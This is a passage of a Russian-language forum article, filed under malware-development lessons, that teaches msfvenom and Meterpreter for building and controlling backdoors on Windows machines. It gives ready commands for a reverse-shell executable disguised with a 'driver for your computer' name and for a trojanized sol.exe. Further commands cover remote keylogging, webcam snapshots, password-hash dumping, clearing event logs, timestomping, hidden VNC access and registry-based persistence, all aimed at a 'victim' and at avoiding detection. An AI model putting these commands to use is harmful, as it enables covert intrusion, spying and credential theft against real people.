+<i><b>msfvenom -p windows/messagebox ICON=&quot;INFORMATION&quot; TITLE=&quot;Compatibility test&quot; TEXT=&quot;The test is processed&quot; -f raw -o mes1</b></i><br />
+<br />
+Мы использовали полезную нагрузку <b>windows/messagebox</b> (создаёт диалоговое окно), эта полезная нагрузка без кодирования (<b>-f raw</b>) была сохранена в файл mes1.<br />
+<br />
+Далее мы вновь используем <b>windows/messagebox</b>, и без кодирования сохраняем в файл mes2. После ключа <b>-c</b> мы указываем файл (mes1), который должен быть включён в создаваемую полезную нагрузку.<br />
+<i><b>msfvenom -c mes1 -p windows/messagebox ICON=&quot;ERROR&quot; TITLE=&quot;Error&quot; TEXT=&quot;Missing necessary files&quot; -f raw -o mes2</b></i><br />
+<br />
+Наконец, уже знакомая нам команда по созданию исполнимого файла, обратите внимание на опцию <b>-c mes2</b>, ей мы добавляем в создаваемый бинарник ранее сгенерированный файл mes2, который уже содержит mes1:<br />
+<i><b>msfvenom -c mes2 -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=4444 -f exe -o driver_dlya_tvoego_computera.exe</b></i><br />
+<br />
+Будет создан файл driver_dlya_tvoego_computera.exe, который при запуске покажет два окна и после этого попытается подключиться к удалённому компьютеру.<br />
+<br />
+Опция <b>-x</b> позволяет указать существующий исполнимый файл (шаблон). Это можно делать для уменьшения подозрения пользователя (исполнимый файл может выполнять полезную для пользователя функцию), либо таким образом можно попытаться заменить уже существующий в системе файл.<br />
+<br />
+Опция <b>-k</b> вместе с предыдущей сохранит нормальное поведение шаблона, и внедрённая полезная нагрузка будет выполняться как отдельный поток:<br />
+<i><b>msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b &quot;\x00&quot; -f exe -o sol_bdoor.exe</b></i><br />
+<br />
+<b>10. Работа с бэкдорами в Metasploit</b><br />
+<br />
+На «атакующей» машине запускаем Metasploit:<br />
+<i><b>msfconsole</b></i><br />
+<br />
+Далее<br />
+<i><b>use exploit/multi/handler<br />
+set payload windows/meterpreter/reverse_tcp</b></i><br />
+<br />
+Обратите внимание, что если вместо <b>windows/meterpreter/reverse_tcp</b> вы выбрали другую полезную нагрузку, то в предыдущей команде замените эту строку на свою.<br />
+<br />
+Нужно установить настройки – IP и порт локальной машины:<br />
+<i><b>set LHOST 192.168.0.196<br />
+set LPORT 4444</b></i><br />
+<br />
+Не забудьте строку 192.168.0.196 поменять на свой IP адрес. Если вы не меняли порт, то его можно не настраивать, поскольку значением по умолчанию является 4444.<br />
+<br />
+Когда настройки сделаны, запустите выполнение модуля:<br />
+<i><b>run<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193919486.png"
+		data-src="https://osint42.org/attachments/1753193919486-png.781/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193919486-png.781/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193919486.png"
+			title="1753193919486.png"
+			width="619" height="556" loading="lazy" />
+	</div></b></i><br />
+Теперь на «цели» запустите исполнимый файл с полезной нагрузкой. Как только это будет сделано, бэкдор подключится к машине атакующего и откроется сессия <b>meterpreter</b>:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193932069.png"
+		data-src="https://osint42.org/attachments/1753193932069-png.782/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193932069-png.782/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193932069.png"
+			title="1753193932069.png"
+			width="954" height="87" loading="lazy" />
+	</div><br />
+<br />
+<b>11. Основы работы в Meterpreter (Meta-Interpreter)</b><br />
+<br />
+Для показа справки наберите <b>?</b> или <b>help</b>. Разнообразных команд много. Думаю, стоит затратить время, чтобы ознакомится с ними со всеми. Если вы хотите получить информацию об опциях конкретной команды, напишите команду и добавьте флаг <b>-h</b>, например, следующая команда покажет опции модуля для управления веб-камерой:<br />
+<i><b>webcam_snap -h<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193944508.png"
+		data-src="https://osint42.org/attachments/1753193944508-png.783/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193944508-png.783/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193944508.png"
+			title="1753193944508.png"
+			width="598" height="265" loading="lazy" />
+	</div></b></i><br />
+<b>Основные команды:</b><br />
+<br />
+Команда                   Описание<br />
+-------                   -----------<br />
+?                         Справка<br />
+background                Перевести в фон текущую сессию<br />
+bgkill                    Убивает фоновый скрипт meterpreter<br />
+bglist                    Список запущенных в фоне скриптов<br />
+bgrun                     Выполнить скрипт meterpreter как фоновый процесс<br />
+channel                   Показывает информацию или управляет активными каналами<br />
+close                     Закрыть канал<br />
+disable_unicode_encoding  Отключает кодирование unicode строк<br />
+enable_unicode_encoding   Включает кодирование unicode строк<br />
+exit                      Прекращает сессию meterpreter<br />
+get_timeouts              Получает значение таймаута текущей сессии<br />
+help                      Справка<br />
+info                      Показывает информацию о модуле Post<br />
+irb                       Перебрасывает в скриптовый режим irb<br />
+load                      Загружает один или более расширений meterpreter<br />
+machine_id                Получить MSF ID прикреплённой к сессии машины<br />
+migrate                   Перенастроить сервер на другой процесс<br />
+quit                      Прекратить сессию meterpreter<br />
+read                      Считывает данные из канала<br />
+resource                  Запуск команд, сохранённых в файл<br />
+run                       Выполнить скрипт meterpreter или модуль Post<br />
+sessions                  Быстро переключиться на другой сеанс<br />
+set_timeouts              Установить значение таймаута текущего сеанса<br />
+sleep                     Заставить Meterpreter замолчать, а затем восстановить сеанс.<br />
+transport                 Изменение текущего механизма передачи<br />
+use                       Устаревший псевдоним для &#039;load&#039;<br />
+uuid                      Получить UUID текущего сеанса<br />
+write                     Записать данные в канал<br />
+<br />
+Итак, с помощью ключевых команд мы можем автоматизировать процесс (выполнять команды из файла), записывать данные в канал, для последующего использования, выполнять долгие задачи в фоне. Особенно обратим внимание на команды <b>info </b>и <b>run </b>– первая покажет информацию об интересующем модуле последующей эксплуатации, а вторая запустит выбранный модуль – к этим вопросам мы вернёмся позже.<br />
+<br />
+Рассмотрим <b>команды файловой системы</b>, некоторые из них имеют одинаковые названия с аналогичными командами в оболочке Linux:<br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+cat           Вывести содержимое файла на экран<br />
+cd            Сменить директорию<br />
+checksum      Получить контрольную сумму файла<br />
+cp            Скопировать файл/директорию в другое место<br />
+dir           Вывести список файлов (псевдоним для ls)<br />
+download      Загрузить файл или директорию<br />
+edit          Отредактировать файл<br />
+getlwd        Вывести локальную рабочую директорию<br />
+getwd         Вывести рабочую директорию<br />
+lcd           Изменить локальную рабочу директорию<br />
+lpwd          Вывести локальную рабочую директорию<br />
+ls            Показать список файлов<br />
+mkdir         Создать директорию<br />
+mv            Переместить файл/директорию в другое место<br />
+pwd           Вывести рабочую директорию<br />
+rm            Удалить указанный файл<br />
+rmdir         Удалить директорию<br />
+search        Поиск файлов<br />
+show_mount    Вывести всех точек монтирования/логических дисков<br />
+upload        Выгрузить файл или директорию<br />
+<br />
+Например, я хочу на удалённый компьютер выгрузить файл driver_dlya_tvoego_computera.exe:<br />
+<i><b>upload driver_dlya_tvoego_computera.exe<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193959489.png"
+		data-src="https://osint42.org/attachments/1753193959489-png.784/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193959489-png.784/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193959489.png"
+			title="1753193959489.png"
+			width="776" height="271" loading="lazy" />
+	</div></b></i><br />
+Просматриваем список файлов на удалённом компьютере и загружаем с него файл allen.zip:<br />
+<br />
+<i><b>ls<br />
+download allen.zip<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193972319.png"
+		data-src="https://osint42.org/attachments/1753193972319-png.785/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193972319-png.785/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193972319.png"
+			title="1753193972319.png"
+			width="869" height="732" loading="lazy" />
+	</div></b></i><br />
+<b>Сетевые команды:</b><br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+arp           Показать ARP кэш хоста<br />
+getproxy      Показать текущие настройки прокси<br />
+ifconfig      Показать интерфейсы<br />
+ipconfig      Показать интерфейсы<br />
+netstat       Показать сетевые соединения<br />
+portfwd       Перенаправить локальный порт на удалённую службу<br />
+resolve       Сделать запросы с цели на преобразование одного или нескольких имён хостов<br />
+route         Просмотр и изменение таблицы маршрутизации<br />
+<br />
+<b>Системные команды:</b><br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+clearev       Очистить журнал событий<br />
+drop_token    Отбрасывает любой активный токен имперсонализации.<br />
+execute       Выполнить команду<br />
+getenv        Получить значение одной или более переменных окружения<br />
+getpid        Получить идентификатор текущего процесса<br />
+getprivs      Попытаться включить все привилегии, доступные для текущего процесса<br />
+getsid        Получение SID пользователя<br />
+getuid        Получение имени пользователя<br />
+kill          Завершить процесс<br />
+localtime     Показать локальную дату и время целевой системы<br />
+pgrep         Фильтрация процессов по имени<br />
+pkill         Завершить процесс по имени<br />
+ps            Список запущенных процессов<br />
+reboot        Перезагрузить удалённый компьютер<br />
+reg           Изменение и взаимодействие с удалённым регистром<br />
+rev2self      Вызов RevertToSelf() на удалённой машине<br />
+shell         Перейти в системную командную оболочку<br />
+shutdown      Отключить удалённый компьютер<br />
+steal_token   Попытаться украсть impersonation token из целевого процесса<br />
+suspend       Приостанавливает или возобновляет список процессов<br />
+sysinfo       Получает информацию об удалённой системе, такую как вид ОС<br />
+Системные команды позволяют получить доступ к удалённой оболочке, что даёт возможность непосредственно вводить команды, позволяют завершать процессы, выключать или перезагружать компьютер, выполнять команды уровня ОС, а также собирать информацию и заметать следы.<br />
+<br />
+<b>Команды пользовательского интерфейса:</b><br />
+<br />
+Команда       Описание<br />
+-------        -----------<br />
+enumdesktops   Список всех доступных рабочих столов и оконных станций<br />
+getdesktop     Получить текущий рабочий стол meterpreter<br />
+idletime       Возвращает количество секунд отсутствия активности удалённого пользователя<br />
+keyscan_dump   Дамп буфера нажатия клавиш<br />
+keyscan_start  Запустить захват нажатие клавиш<br />
+keyscan_stop   Остановить захват нажатия клавиш<br />
+screenshot     Получение скриншота интерактивного рабочего стола<br />
+setdesktop     Изменение текущего рабочего стола meterpreters<br />
+uictl          Контроль некоторых компонентов пользовательских интерфейсов<br />
+Данный набор команд позволяет делать скриншоты с удалённого компьютера, отключать и включать мышь, клавиатуру, следить на нажатыми пользователем клавишами.<br />
+<br />
+Для начала захвата нажатия клавиш введите:<br />
+<i><b>keyscan_start</b></i><br />
+<br />
+Чтобы посмотреть, какие клавиши и в каких программах ввёл пользователь выполните:<br />
+<i><b>keyscan_dump<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193986283.png"
+		data-src="https://osint42.org/attachments/1753193986283-png.786/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193986283-png.786/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193986283.png"
+			title="1753193986283.png"
+			width="583" height="312" loading="lazy" />
+	</div></b></i><br />
+<b>Команды для управления веб-камерой:</b><br />
+<br />
+Команда       Описание<br />
+-------        -----------<br />
+record_mic     Запись аудио со стандартного микрофона в течение X секунд<br />
+webcam_chat    Начать видеочат<br />
+webcam_list    Вывести список веб-камер<br />
+webcam_snap    Сделать снимок указанной веб-камерой<br />
+webcam_stream  Запустить выдиопоток с выбранной веб-камеры<br />
+<br />
+На мой взгляд, очень интересные функции. Чтобы проверить, имеет ли компьютер жертвы веб-камеры выполните<br />
+<i><b>webcam_list </b></i><br />
+<br />
+В моём случае обнаружена одна веб-камера SC-20FHL11146M, чтобы сделать с неё снимок набираю (замените имя веб-камеры):<br />
+<i><b>webcam_snap SC-20FHL11146M</b></i><br />
+<br />
+Будет сделана и показана фотография с веб-камеры удалённого компьютера.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193997893.png"
+		data-src="https://osint42.org/attachments/1753193997893-png.787/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193997893-png.787/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193997893.png"
+			title="1753193997893.png"
+			width="427" height="152" loading="lazy" />
+	</div><br />
+<br />
+<b>Команды повышения привилегий:</b><br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+getsystem     Пытается поднять ваши привилегии на данной локальной системе.<br />
+<br />
+<b>Команда для работы с базой данных паролей:</b><br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+hashdump      Дампит содержимое базы данных SAM<br />
+<br />
+<b>Команды для работы с Timestomp (временными метками файла):</b><br />
+<br />
+Команда       Описание<br />
+-------       -----------<br />
+timestomp     Манипуляция файловыми атрибутами MACE<br />
+<br />
+Чтобы замести следы, иногда может быть полезным изменить атрибуты MACE (запись изменения, доступа, создания) файла.<br />
+<br />
+<b>12. Скрытый доступ к удалённому рабочему столу (VNC)</b><br />
+<br />
+Для скрытого доступа к удалённому рабочему столу посредством VNC нужно выбрать полезную нагрузку, содержащую слово <b>vncinject</b>, к примеру, такой полезной нагрузкой является <b>windows/vncinject/reverse_tcp</b>:<br />
+<br />
+<i><b>msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.0.196 -f exe -o vnc.exe</b></i><br />
+<br />
+Далее запустите Metasploit (если вы это ещё не сделали):<br />
+<i><b>msfconsole</b></i><br />
+<br />
+Внутри Metasploit:<br />
+<br />
+<i><b>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index<br />
+set payload windows/vncinject/reverse_tcp<br />
+set lhost 192.168.0.196<br />
+set rhost 192.168.0.244<br />
+run</b></i><br />
+<br />
+Обратите внимание, что в отличие от работы с Meterpreter, мы используем <b>exploit/windows/smb/ms09_050_smb2_negotiate_func_index</b>. Также нам необходимо установить IP адрес удалённого хоста (<b>set rhost</b> 192.168.0.244).<br />
+<br />
+После запуска эксплойта, запустите исполнимый файл с полезной нагрузкой на компьютере жертвы. Вы увидите удалённый рабочий стол компьютера жертвы.<br />
+<br />
+В качестве альтернативы, можно использовать 64-битную версию полезной нагрузки: <b>windows/x64/vncinject/reverse_tcp</b>.<br />
+<br />
+На машине атакующего должен быть установлен VNC клиент (просмотрщик).<br />
+<br />
+<b> 13. Закрепление доступа</b><br />
+<br />
+До недавнего времени для закрепления доступа – создания бэкдора, который запускается при каждой загрузки системы – использовался скрипт <b>persistence</b>:<br />
+<i><b>run persistence -h</b></i><br />
+<br />
+Но в настоящее время скрипты Meterpreter считаются устаревшими, поэтому рекомендуется использовать модуль <b>post/windows/manage/persistence_exe</b>. Это Windows Manage Persistent EXE Payload Installer, т.е. установщик постоянной полезной нагрузки EXE в Windows.<br />
+<br />
+Этот модуль выгрузит на удалённый хост исполнимый файл и сделает его постоянным – т.е. скопирует в определённое место и добавит ключ в реестр Windows для автоматического запуска при каждом старте Windows. Он может быть установлен как <b>USER</b>, <b>SYSTEM </b>или <b>SERVICE</b>. При выборе USER, программа запустится при входе пользователя; при выборе SYSTEM – запустится при загрузке системы, для этого требуются соответствующие привилегии; при выборе SERVICE будет создана служба, которая запустит полезную нагрузку, также требуются привилегии.<br />
+<br />
+Опции модуля:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>Имя      Текущее значение  Требуется  Описание
+----      ---------------  --------  -----------
+REXENAME    default.exe      да       Имя exe файла на удалённой системе
+REXEPATH                   да       Файл, который нужно загрузить на удалённую систему
+SESSION                    да       Сессия, на которой запустить этот модуль
+STARTUP   USER             да       Тип запуска постоянной нагрузки. (Варианты: USER, SYSTEM, SERVICE)</code></pre>
+	</div>
+</div><br />
+Пример запуска<br />
+<br />
+<i><b>run post/windows/manage/persistence_exe REXEPATH=/local/path/to/your/payload.exe REXENAME=default.exe STARTUP=SYSTEM</b></i><br />
+<br />
+Эта команда означает, что на удалённый хост будет выгружен файл payload.exe, который на локальной системе размещён по пути /local/path/to/your/payload.exe, этот файл на удалённой системе будет переименован в default.exe и будет запущен с системными привилегиями.<br />
+<br />
+Ещё один пример:<br />
+<i><b>run post/windows/manage/persistence_exe REXEPATH=/home/mial/backdoor2.exe<br />
+<div class="bbImageWrapper  js-lbImage" title="1753194012444.png"
+		data-src="https://osint42.org/attachments/1753194012444-png.788/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753194012444-png.788/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753194012444.png"
+			title="1753194012444.png"
+			width="1055" height="873" loading="lazy" />
+	</div></b></i><br />
+Модуль вывел следующую информацию:<br />
+<br />
+[*] Running module against MIAL-PC<br />
+[*] Reading Payload from file /home/mial/backdoor2.exe<br />
+[+] Persistent Script written to C:\Users\Alex\AppData\Local\Temp\default.exe<br />
+[*] Executing script C:\Users\Alex\AppData\Local\Temp\default.exe<br />
+[+] Agent executed with PID 6572<br />
+[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MHlFtyrXIllAQ<br />
+[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MHlFtyrXIllAQ<br />
+[*] Cleanup Meterpreter RC File: /home/mial/.msf4/logs/persistence/MIAL-PC_20170519.0352/MIAL-PC_20170519.0352.rс<br />
+<br />
+Т.е. на удалённой системе файл сохранён по пути C:\Users\Alex\AppData\Local\Temp\default.exe, для автозапуска сделана запись в реестре Windows по пути HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MHlFtyrXIllAQ.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753194029033.png"
+		data-src="https://osint42.org/attachments/1753194029033-png.789/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753194029033-png.789/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753194029033.png"
+			title="1753194029033.png"
+			width="709" height="358" loading="lazy" />
+	</div><br />
+<br />
+<b>14. Модули последующей эксплуатации Metasploit<br />
+<br />
+post/windows/manage/persistence_exe</b> – это всего лишь один из модулей последующей эксплуатации, которые присутствуют в Metasploit для Windows.<br />
+<br />
+Некоторые примеры:<br />
+<ul>
+<li data-xf-list-type="ul"><b>post/windows/gather/enum_chrome</b> – извлечение чувствительной информации из веб-браузера Google Chrome</li>
+<li data-xf-list-type="ul"><b>post/windows/gather/credentials/total_commander</b> – извлечение паролей из Total Commander</li>
+<li data-xf-list-type="ul"><b>post/windows/escalate/screen_unlock</b> – разблокировка экрана Windows (будьте осторожны с этим модулем)</li>
+<li data-xf-list-type="ul"><b>post/windows/gather/phish_windows_credentials</b> – фишинговая атака на учётные данные Windows</li>
+</ul>Количество модулей достаточно велико:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753194085961.png"
+		data-src="https://osint42.org/attachments/1753194085961-png.790/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753194085961-png.790/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753194085961.png"
+			title="1753194085961.png"
+			width="1236" height="719" loading="lazy" />
+	</div><br />
+<br />
+Все эти модули можно применять во время сеанса Meterpreter.<br />
+<br />
+<b> 15. Когда обратный шелл не нужен</b><br />
+<br />
+Если вы можете установить бэкдор на целевой компьютер, то вполне возможно, что вам подойдут другие альтернативы, а обратный шелл просто не нужен. Например, если на целевой машине уже запущен SSH сервер, то вы можете попытаться добавить к нему нового пользователя и использовать его.<br />
+<br />
+Если целевая машина – это веб-сервер, который поддерживает на стороне сервера язык программирования, то вы можете оставить бэкдор на этом языке. Например, многие сервера Apache поддерживают PHP, в этом случае вы можете использовать PHP &quot;web shell&quot;. IIS сервера обычно поддерживают ASP, или ASP.net. Metasploit Framework предлагает полезные нагрузки на всех этих языках (и многих других).<br />
+<br />
+Аналогично для VNC, удалённого рабочего стола, SMB (psexec), других инструментов удалённого администрирования и т.д.<br />
+<br />
+<b> 16. Заключение</b><br />
+<br />
+Итак, как мы могли сами убедиться <b>MSFvenom </b>позволяет генерировать полезную нагрузку, а <b>Meterpreter </b>помогает скрыто управлять удалённой системой.<br />
+<br />
+В целом это обзорная статья, цель которой – показать некоторые возможности <a href="https://kali.tools/?p=1551" target="_blank" class="link link--external" rel="noopener"><b>Metasploit</b></a>. В реальной практической ситуации нужно подобрать полезную нагрузку в соответствии с разными сценариями: на случай смены IP жертвой, на случай смены IP атакующим, решить проблемы доставки полезной нагрузки и избежание обнаружения антивирусами.</div>
+					
+
+					
+						
+
+	
+		
+	
+
+					
+					
+										
+
+					
+
+					
+						
+					
+
+					
+
+					
+
+					<div class="reactionsBar js-reactionsList ">
+						
+					</div>
+
+					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
+				</article>
+			</div>
+		</div>
+	</div>
+	
+	
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<div class="columnContainer"
+		data-xf-init="lightbox"
+		data-lb-id="article-56"
+		data-lb-universal="0">
+
+		<span class="u-anchorTarget" id="comments"></span>
+
+		<div class="columnContainer-comments">
+			
+	
+	
+
+	<div class="block block--messages"
+		data-xf-init=""
+		data-type="ams_comment"
+		data-href="/inline-mod/">
+
+		
+	
+	
+
+
+		<div class="block-outer"></div>
+		
+		<div class="block-container"
+			data-xf-init="select-to-quote"
+			data-message-selector=".js-comment">
+			
+			<h3 class="block-header">Комментарии</h3>
+			<div class="block-body js-replyNewCommentContainer">
+				
+					<div class="blockMessage js-replyNoMessages">Нет комментариев для отображения.</div>
+				
+			</div>
+		</div>
+
+		<div class="block-outer block-outer--after">
+			
+			
+		</div>
+
+		
+	
+	
+
+	</div>
+
+	
+	
+	
+
+	
+
+
+		</div>
+	</div>	
+
+
+
+
+
+		
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+	
+
+
+
+	
+
+
+
+
+	
+</div>
+					
+				</div>
+
+				
+					<div class="p-body-sidebar">
+						
+						
+							<div class="block">
+		<div class="block-container">
+			<h3 class="block-minorHeader">Информация о статье</h3>
+			<div class="block-body block-row block-row--minor">
+				<dl class="pairs pairs--justified">
+					<dt>Автор</dt>
+					
+						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
+					
+				</dl>
+				
+					<dl class="pairs pairs--justified">
+						<dt>Article read time</dt>
+						<dd>17 min read</dd>
+					</dl>
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Просмотры</dt>
+						<dd>497</dd>
+					</dl>
+				
+				
+				
+				
+					<dl class="pairs pairs--justified">
+						<dt>Последнее обновление</dt>
+						<dd><time  class="u-dt" dir="auto" datetime="2025-07-22T17:25:06+0300" data-timestamp="1753194306" data-date="22.07.2025" data-time="17:25" data-short="22 Июл" title="22.07.2025 в 17:25">22.07.2025</time></dd>
+					</dl>
+				
+				
+				
+
+				
+			</div>
+		</div>
+	</div>
+						
+							<div class="block">
+			<div class="block-container">
+				<h3 class="block-minorHeader"><a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">Больше в Уроки разработки вредоносного софта</a></h3>
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">Обход антивирусов через уязвимый драйвер</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Пока хакер не прикрыли, из-за дурацких законов, решил скопировать приватную статью.
+
+Вот...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../unichtozhayem-signaturnyye-antivirusy.57/index.html">Уничтожаем сигнатурные антивирусы</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно такие тулзы были популярны, возможно и сейчас будет находкой, кто занимается...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - Загрузка DLL из ОЗУ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно писал свой загрузчик DLL, но сейчас на гитхабе наткнулся на более взрослый...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../pro-botnet-i-kak-delat-nel-zya.16/index.html">Про ботнет и как делать нельзя</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Когда-то давно участвовал в конкурсе статей на xss.is, мы решили для конкурса сделать ботнет...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../tsikl-statei-izucheniye-vredonosnykh-programm.6/index.html">Цикл статей &quot;Изучение вредоносных программ&quot;</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Всем привет!
+
+Решил перепостить свой цикл статей по разработки малвари.
+
+Статьи будут оформлены...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+					</ul>
+				</div>
+			</div>
+		</div>
+						
+							<div class="block">
+			<div class="block-container">
+				
+					<h3 class="block-minorHeader"><a href="../authors/0x42.1/index.html">Больше от 0x42</a></h3>
+				
+
+				<div class="block-body block-row">
+					<ul class="articleSidebarList">
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">О том как борются с TOR в РФ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				Недавно решил поддержать проект TOR, решил поднять middle relay.
+
+Напомню, что для поддержки...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
+		</div>
+		
+		<div class="contentRow-main contentRow-main--close">
+			<a href="../bezumnyi-maks-skam.74/index.html">Безумный МАКС/СКАМ</a>
+
+			
+			
+			<div class="contentRow-snippet">
+				По телевизору передают, что мессенджер МАКС полюбили россияне, зарегистрировалось почти вся...
+			</div>				
+
+			
+		</div>
+	</div>
+
+						</li>
+					
+						<li>
+							
+	
+	<div class="contentRow">
+		<div class="contentRow-figure">
+			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
+			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
+		</a>
